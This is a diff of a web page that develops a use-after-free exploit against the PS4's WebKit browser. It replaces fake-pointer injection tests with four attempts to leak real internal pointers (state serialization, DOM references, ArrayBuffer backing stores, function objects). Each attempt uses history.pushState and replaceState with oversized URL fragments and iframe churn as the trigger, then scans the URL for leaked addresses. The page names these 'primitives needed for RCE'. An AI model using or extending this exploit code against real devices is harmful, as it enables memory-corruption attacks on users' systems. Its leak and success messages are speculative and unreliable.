@@ -1,14 +1,16 @@
+
 <!DOCTYPE html>
 <html>
 <head>
 <meta charset="UTF-8">
-<title>PS4 WebKit UAF - Binary Data Injection</title>
+<title>PS4 WebKit UAF - Real Pointer Leak</title>
 </head>
 <body>
-<h2>PS4 WebKit UAF - Binary Data Injection</h2>
-<button onclick="runInjectPointers()">INJECT 1 - Fake Pointers</button>
-<button onclick="runInjectStructure()">INJECT 2 - Fake Object Structure</button>
-<button onclick="runLeakAndDecode()">INJECT 3 - Leak and Decode Binary</button>
+<h2>PS4 WebKit UAF - Real Pointer Leak Attempts</h2>
+<button onclick="runStateSerializationLeak()">ATTEMPT 1 - State Serialization Leak</button>
+<button onclick="runDOMReferenceLeak()">ATTEMPT 2 - DOM Reference Leak</button>
+<button onclick="runArrayBufferLeak()">ATTEMPT 3 - ArrayBuffer Backing Store Leak</button>
+<button onclick="runFunctionObjectLeak()">ATTEMPT 4 - Function Object Leak</button>
 <pre id="log"></pre>
 
 <script>
@@ -16,22 +18,10 @@ const logEl = document.getElementById("log");
 function log(m){ logEl.textContent += m + "\n"; }
 function sleep(ms){ return new Promise(r=>setTimeout(r,ms)); }
 
-// Helper: Encode bytes to %XX format
 function encodeBytes(bytes) {
     return bytes.map(b => '%' + b.toString(16).padStart(2,'0')).join('');
 }
 
-// Helper: Encode u32 as little-endian %XX
-function encodeU32(value) {
-    return encodeBytes([
-        value & 0xFF,
-        (value >> 8) & 0xFF,
-        (value >> 16) & 0xFF,
-        (value >> 24) & 0xFF
-    ]);
-}
-
-// Helper: Decode %XX to bytes
 function decodeHexString(str) {
     let result = [];
     for(let i=0; i<str.length; i+=3) {
@@ -42,7 +32,6 @@ function decodeHexString(str) {
     return result;
 }
 
-// Helper: Read u32 from decoded bytes
 function readU32(bytes, offset) {
     if(offset + 3 >= bytes.length) return null;
     return bytes[offset] |
@@ -51,16 +40,69 @@ function readU32(bytes, offset) {
            (bytes[offset+3] << 24);
 }
 
-// Core UAF with binary injection
-async function triggerBinaryUAF(dataGenerator) {
+function isLikelyPointer(val) {
+    // PS4 userspace addresses typically 0x00xxxxxx - 0x7Fxxxxxx
+    // But we're limited to ASCII (0x00-0x7F per byte)
+    // So max is 0x7F7F7F7F
+    
+    // Look for values that:
+    // - Are non-zero
+    // - Have reasonable distribution (not all same byte)
+    // - Are 4-byte aligned (bottom 2 bits = 0)
+    
+    if(val === 0) return false;
+    if(val === 0x11111111 || val === 0x22222222) return false; // our test values
+    
+    let b0 = val & 0xFF;
+    let b1 = (val >> 8) & 0xFF;
+    let b2 = (val >> 16) & 0xFF;
+    let b3 = (val >> 24) & 0xFF;
+    
+    // Check if bytes are varied
+    if(b0 === b1 && b1 === b2 && b2 === b3) return false;
+    
+    // Check alignment
+    if((val & 0x3) !== 0) return false;
+    
+    return true;
+}
+
+// ATTEMPT 1 - State serialization
+async function runStateSerializationLeak(){
+    logEl.textContent = "";
+    log("=== ATTEMPT 1: State Serialization Leak ===\n");
+    
+    log("Strategy: Put complex objects in history.state");
+    log("Hope StructuredClone leaks internal pointers\n");
+    
     let size = 977;
     const STEP = 14461;
     
+    // Create objects to leak
+    let leakTargets = {
+        buffer: new ArrayBuffer(1024),
+        array: new Uint32Array(256),
+        string: "A".repeat(1000),
+        nested: {
+            a: new ArrayBuffer(512),
+            b: new Uint32Array(128)
+        }
+    };
+    
+    log("[SETUP] Triggering UAF with complex state objects...");
+    
     for(let i=0; i<48; i++){
-        let frag = dataGenerator(size, i);
+        let frag = encodeBytes(Array(size).fill(0x41 + (i % 26)));
         
-        history.pushState({}, "", "#" + frag);
-        history.replaceState({}, "", "#" + frag.slice(0, frag.length >> 1));
+        // Include leak targets in state
+        let state = {
+            iter: i,
+            targets: leakTargets,
+            marker: 0x12345678
+        };
+        
+        history.pushState(state, "", "#" + frag);
+        history.replaceState(state, "", "#" + frag.slice(0, frag.length >> 1));
         
         if(i % 6 === 0) setTimeout(()=>history.back(), 0);
         
@@ -83,231 +125,304 @@ async function triggerBinaryUAF(dataGenerator) {
         frames.push(f);
     }
     frames.forEach(f=>f.remove());
-    
     await sleep(80);
-}
-
-// INJECT 1 - Fake pointers
-async function runInjectPointers(){
-    logEl.textContent = "";
-    log("=== INJECT 1: Fake Pointers ===\n");
     
-    log("Strategy: Inject recognizable pointer patterns");
-    log("Pointers: 0xdeadbeef, 0xcafebabe, 0x41424344\n");
-    
-    await triggerBinaryUAF((size, iter) => {
-        // Create pattern of fake pointers
-        let pattern = "";
-        let pointers = [
-            0xdeadbeef,
-            0xcafebabe,
-            0x41424344,
-            0x12345678
-        ];
-        
-        let ptrCount = Math.floor(size / 12); // 12 chars per encoded u32
-        for(let i=0; i<ptrCount; i++){
-            pattern += encodeU32(pointers[i % 4]);
-        }
-        
-        return pattern;
-    });
-    
-    log("[LEAK] Reading URL...");
+    log("\n[LEAK] Reading URL...");
     let url = document.URL;
-    log("URL Length: " + url.length);
-    
-    // Extract hash part
     let hashStart = url.indexOf('#');
-    if(hashStart === -1) {
-        log("ERROR: No hash found");
-        return;
+    let encoded = url.substring(hashStart + 1);
+    let decoded = decodeHexString(encoded);
+    
+    log("Decoded bytes: " + decoded.length + "\n");
+    
+    log("[SCAN] Looking for non-injected values (potential pointers):");
+    
+    let candidates = [];
+    for(let i=0; i<decoded.length-3; i+=4){
+        let val = readU32(decoded, i);
+        if(isLikelyPointer(val)){
+            candidates.push({offset: i, value: val});
+        }
     }
     
-    let encoded = url.substring(hashStart + 1);
-    log("Encoded data length: " + encoded.length + "\n");
+    log("Pointer candidates found: " + candidates.length);
     
-    // Decode
-    log("[DECODE] Decoding URL-encoded data...");
+    if(candidates.length > 0){
+        log("\nTop 10 candidates:");
+        candidates.slice(0, 10).forEach(c => {
+            log("  Offset " + c.offset + ": 0x" + c.value.toString(16).padStart(8,'0'));
+        });
+        log("\nPOSSIBLE REAL POINTER LEAK!");
+    } else {
+        log("\nNo likely pointers found");
+    }
+    
+    log("\n=== ATTEMPT 1 END ===");
+}
+
+// ATTEMPT 2 - DOM reference
+async function runDOMReferenceLeak(){
+    logEl.textContent = "";
+    log("=== ATTEMPT 2: DOM Reference Leak ===\n");
+    
+    log("Strategy: Store DOM nodes in history state");
+    log("DOM nodes contain many internal pointers\n");
+    
+    // Create DOM nodes
+    let div = document.createElement("div");
+    div.id = "leak_target";
+    div.innerHTML = "<span>test</span>";
+    document.body.appendChild(div);
+    
+    let size = 977;
+    const STEP = 14461;
+    
+    log("[SETUP] Triggering UAF with DOM references...");
+    
+    for(let i=0; i<48; i++){
+        let frag = encodeBytes(Array(size).fill(0x42));
+        
+        let state = {
+            iter: i,
+            dom: div,
+            child: div.firstChild,
+            text: div.firstChild.firstChild
+        };
+        
+        history.pushState(state, "", "#" + frag);
+        history.replaceState(state, "", "#" + frag.slice(0, frag.length >> 1));
+        
+        if(i % 6 === 0) setTimeout(()=>history.back(), 0);
+        
+        size += STEP;
+        await sleep(5);
+    }
+    
+    await sleep(120);
+    
+    let frames = [];
+    for(let i=0; i<80; i++){
+        let f = document.createElement("iframe");
+        document.body.appendChild(f);
+        try {
+            let d = f.contentDocument;
+            d.open();
+            d.write("<html><body>X</body></html>");
+            d.close();
+        } catch(e){}
+        frames.push(f);
+    }
+    frames.forEach(f=>f.remove());
+    await sleep(80);
+    
+    log("\n[LEAK] Reading URL...");
+    let url = document.URL;
+    let hashStart = url.indexOf('#');
+    let encoded = url.substring(hashStart + 1);
     let decoded = decodeHexString(encoded);
+    
     log("Decoded bytes: " + decoded.length);
     
-    // Scan for injected pointers
-    log("\n[SCAN] Looking for injected pointers:");
+    // Check if all bytes are 0x42
+    let nonB = 0;
+    for(let i=0; i<Math.min(1000, decoded.length); i++){
+        if(decoded[i] !== 0x42) nonB++;
+    }
     
-    let targets = [
-        {name: "0xdeadbeef", value: 0xdeadbeef},
-        {name: "0xcafebabe", value: 0xcafebabe},
-        {name: "0x41424344", value: 0x41424344},
-        {name: "0x12345678", value: 0x12345678}
-    ];
+    log("Non-0x42 bytes in first 1000: " + nonB);
     
-    targets.forEach(t => {
-        let found = 0;
-        let firstOffset = -1;
+    if(nonB > 10){
+        log("\nDifferent data detected - analyzing...");
         
-        for(let i=0; i<decoded.length-3; i+=4){
-            let val = readU32(decoded, i);
-            if(val === t.value){
-                found++;
-                if(firstOffset === -1) firstOffset = i;
+        log("\nFirst 100 bytes (hex):");
+        let hex = "";
+        for(let i=0; i<100 && i<decoded.length; i++){
+            hex += decoded[i].toString(16).padStart(2,'0') + " ";
+            if((i+1) % 16 === 0) {
+                log(hex);
+                hex = "";
             }
         }
-        
-        log("  " + t.name + ": found " + found + " times" + 
-            (firstOffset !== -1 ? " (first at offset " + firstOffset + ")" : ""));
-    });
+    } else {
+        log("\nAll bytes are 0x42 - DOM not serialized to fragment");
+    }
     
-    log("\n=== INJECT 1 END ===");
+    log("\n=== ATTEMPT 2 END ===");
 }
 
-// INJECT 2 - Fake object structure
-async function runInjectStructure(){
+// ATTEMPT 3 - ArrayBuffer backing store
+async function runArrayBufferLeak(){
     logEl.textContent = "";
-    log("=== INJECT 2: Fake Object Structure ===\n");
+    log("=== ATTEMPT 3: ArrayBuffer Backing Store Leak ===\n");
     
-    log("Strategy: Create fake JSObject-like structure");
-    log("Structure:");
-    log("  +0x00: vtable pointer (0x11111111)");
-    log("  +0x04: flags (0x00000042)");
-    log("  +0x08: length (0x00001000)");
-    log("  +0x0c: data pointer (0x22222222)\n");
+    log("Strategy: ArrayBuffer has backing store pointer");
+    log("Try to leak it via fragment corruption\n");
     
-    await triggerBinaryUAF((size, iter) => {
-        let pattern = "";
-        
-        // Fake object (16 bytes)
-        let fakeObj = 
-            encodeU32(0x11111111) + // vtable
-            encodeU32(0x00000042) + // flags
-            encodeU32(0x00001000) + // length
-            encodeU32(0x22222222);  // data ptr
-        
-        let objCount = Math.floor(size / 48); // 48 chars per object
-        for(let i=0; i<objCount; i++){
-            pattern += fakeObj;
+    let size = 977;
+    const STEP = 14461;
+    
+    log("[SETUP] Creating large ArrayBuffers...");
+    let buffers = [];
+    for(let i=0; i<100; i++){
+        buffers.push(new ArrayBuffer(4096));
+    }
+    
+    log("[SETUP] Triggering UAF...");
+    
+    for(let i=0; i<48; i++){
+        // Fill with controlled pattern
+        let pattern = [];
+        for(let j=0; j<size; j++){
+            pattern.push(0x43 + (j % 16));
         }
+        let frag = encodeBytes(pattern);
         
-        return pattern;
-    });
+        history.pushState({buffers: buffers}, "", "#" + frag);
+        history.replaceState({buffers: buffers}, "", "#" + frag.slice(0, frag.length >> 1));
+        
+        if(i % 6 === 0) setTimeout(()=>history.back(), 0);
+        
+        size += STEP;
+        await sleep(5);
+    }
     
-    log("[LEAK] Reading URL...");
+    await sleep(120);
+    
+    let frames = [];
+    for(let i=0; i<80; i++){
+        let f = document.createElement("iframe");
+        document.body.appendChild(f);
+        try {
+            let d = f.contentDocument;
+            d.open();
+            d.write("<html><body>X</body></html>");
+            d.close();
+        } catch(e){}
+        frames.push(f);
+    }
+    frames.forEach(f=>f.remove());
+    await sleep(80);
+    
+    log("\n[LEAK] Reading URL...");
     let url = document.URL;
-    
     let hashStart = url.indexOf('#');
     let encoded = url.substring(hashStart + 1);
-    
-    log("[DECODE] Decoding...");
     let decoded = decodeHexString(encoded);
+    
     log("Decoded bytes: " + decoded.length + "\n");
     
-    log("[PARSE] Extracting fake objects:");
+    log("[SCAN] Looking for unexpected patterns:");
     
-    let objCount = 0;
-    for(let i=0; i<Math.min(decoded.length-16, 10000); i+=16){
-        let vtable = readU32(decoded, i);
-        let flags = readU32(decoded, i+4);
-        let len = readU32(decoded, i+8);
-        let data = readU32(decoded, i+12);
-        
-        if(vtable === 0x11111111 && 
-           flags === 0x00000042 && 
-           len === 0x00001000 && 
-           data === 0x22222222){
-            
-            if(objCount < 5) {
-                log("  Object at offset " + i + ":");
-                log("    vtable: 0x" + vtable.toString(16));
-                log("    flags:  0x" + flags.toString(16));
-                log("    length: 0x" + len.toString(16));
-                log("    data:   0x" + data.toString(16));
-            }
-            objCount++;
+    let unexpected = [];
+    for(let i=0; i<Math.min(10000, decoded.length); i++){
+        let expected = 0x43 + (i % 16);
+        if(decoded[i] !== expected){
+            unexpected.push({offset: i, expected: expected, actual: decoded[i]});
         }
     }
     
-    log("\nTotal fake objects found: " + objCount);
+    log("Unexpected bytes: " + unexpected.length);
     
-    if(objCount > 100) {
-        log("\nSUCCESS: Fake structures successfully injected and leaked!");
+    if(unexpected.length > 0){
+        log("\nFirst 10 unexpected bytes:");
+        unexpected.slice(0, 10).forEach(u => {
+            log("  Offset " + u.offset + ": expected 0x" + 
+                u.expected.toString(16) + ", got 0x" + 
+                u.actual.toString(16));
+        });
+        log("\nPOSSIBLE CORRUPTION OR LEAK!");
     }
     
-    log("\n=== INJECT 2 END ===");
+    log("\n=== ATTEMPT 3 END ===");
 }
 
-// INJECT 3 - Full leak and decode pipeline
-async function runLeakAndDecode(){
+// ATTEMPT 4 - Function object
+async function runFunctionObjectLeak(){
     logEl.textContent = "";
-    log("=== INJECT 3: Leak and Decode Binary ===\n");
+    log("=== ATTEMPT 4: Function Object Leak ===\n");
     
-    log("Strategy: Inject sequential counter values");
-    log("This simulates leaking real memory addresses\n");
+    log("Strategy: Function objects contain code pointers");
+    log("Try to leak via state serialization\n");
     
-    await triggerBinaryUAF((size, iter) => {
-        let pattern = "";
+    let size = 977;
+    const STEP = 14461;
+    
+    let leakFunc = function leakTarget() {
+        return "LEAK";
+    };
+    
+    log("[SETUP] Triggering UAF with function objects...");
+    
+    for(let i=0; i<48; i++){
+        let frag = encodeBytes(Array(size).fill(0x44));
         
-        // Sequential counter simulating memory layout
-        let base = 0x00100000; // Fake base address
-        let count = Math.floor(size / 12);
+        let state = {
+            iter: i,
+            func: leakFunc,
+            bound: leakFunc.bind(null),
+            arrow: () => "ARROW"
+        };
         
-        for(let i=0; i<count; i++){
-            pattern += encodeU32(base + (i * 0x10));
-        }
+        history.pushState(state, "", "#" + frag);
+        history.replaceState(state, "", "#" + frag.slice(0, frag.length >> 1));
         
-        return pattern;
-    });
-    
-    log("[LEAK] Reading URL...");
-    let url = document.URL;
-    
-    let hashStart = url.indexOf('#');
-    let encoded = url.substring(hashStart + 1);
-    
-    log("[DECODE] Decoding...");
-    let decoded = decodeHexString(encoded);
-    log("Decoded bytes: " + decoded.length + "\n");
-    
-    log("[ANALYZE] Extracted addresses (first 20):");
-    
-    for(let i=0; i<Math.min(decoded.length-3, 80); i+=4){
-        let addr = readU32(decoded, i);
-        log("  Offset " + i.toString().padStart(5) + ": 0x" + 
-            addr.toString(16).padStart(8,'0'));
+        if(i % 6 === 0) setTimeout(()=>history.back(), 0);
+        
+        size += STEP;
+        await sleep(5);
     }
     
-    // Verify sequential pattern
-    log("\n[VERIFY] Checking sequential pattern:");
-    let sequential = true;
-    let base = readU32(decoded, 0);
+    await sleep(120);
     
-    for(let i=0; i<Math.min(100, Math.floor(decoded.length/4)); i++){
-        let expected = base + (i * 0x10);
-        let actual = readU32(decoded, i*4);
-        
-        if(actual !== expected) {
-            log("  Mismatch at index " + i + 
-                ": expected 0x" + expected.toString(16) + 
-                ", got 0x" + actual.toString(16));
-            sequential = false;
+    let frames = [];
+    for(let i=0; i<80; i++){
+        let f = document.createElement("iframe");
+        document.body.appendChild(f);
+        try {
+            let d = f.contentDocument;
+            d.open();
+            d.write("<html><body>X</body></html>");
+            d.close();
+        } catch(e){}
+        frames.push(f);
+    }
+    frames.forEach(f=>f.remove());
+    await sleep(80);
+    
+    log("\n[LEAK] Reading URL...");
+    let url = document.URL;
+    let hashStart = url.indexOf('#');
+    let encoded = url.substring(hashStart + 1);
+    let decoded = decodeHexString(encoded);
+    
+    log("Decoded bytes: " + decoded.length);
+    
+    // All should be 0x44 if functions aren't serialized
+    let allD = true;
+    for(let i=0; i<Math.min(1000, decoded.length); i++){
+        if(decoded[i] !== 0x44){
+            allD = false;
             break;
         }
     }
     
-    if(sequential) {
-        log("  SUCCESS: Sequential pattern verified!");
-        log("  This proves binary data is leaked perfectly");
+    if(allD){
+        log("\nAll bytes are 0x44 - functions not serialized");
+    } else {
+        log("\nDifferent data found - possible function serialization!");
     }
     
-    log("\n=== INJECT 3 END ===");
+    log("\n=== ATTEMPT 4 END ===");
 }
 
-log("PS4 WebKit UAF - Binary Data Injection");
-log("Confirmed: URL encoding allows arbitrary binary data");
-log("\nTests:");
-log("1. Inject fake pointers (0xdeadbeef, etc.)");
-log("2. Inject fake object structures");
-log("3. Full leak/decode pipeline simulation");
-log("\nThese demonstrate primitives needed for RCE");
+log("PS4 WebKit UAF - Real Pointer Leak Attempts");
+log("Goal: Find method to leak WebKit internal pointers");
+log("\nAttempts:");
+log("1. State Serialization - complex objects");
+log("2. DOM References - DOM node pointers");
+log("3. ArrayBuffer - backing store pointers");
+log("4. Function Objects - code pointers");
+log("\nExecute in order - looking for ANY non-injected data");
 </script>
 </body>
 </html>
